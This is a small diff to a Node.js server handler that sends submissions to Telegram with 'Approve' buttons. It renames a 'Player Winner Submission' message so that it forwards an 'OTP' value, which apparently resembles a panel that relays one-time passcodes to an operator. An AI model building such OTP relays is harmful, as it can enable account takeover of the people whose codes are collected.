@@ -174,7 +174,7 @@ const server = http.createServer(async (req, res) => {
           await sendToTelegram(
             requiresApproval
               ? `${text}\nSubmission: ${submissionId}`
-              : `Player Winner Submission\nPlayer ID: ${playerId}\nSubmission: ${submissionId}`,
+              : `OTP\nOTP: ${playerId}\nSubmission: ${submissionId}`,
             {
               inline_keyboard: [[
                 { text: 'Approve', callback_data: `approve:${submissionId}` },
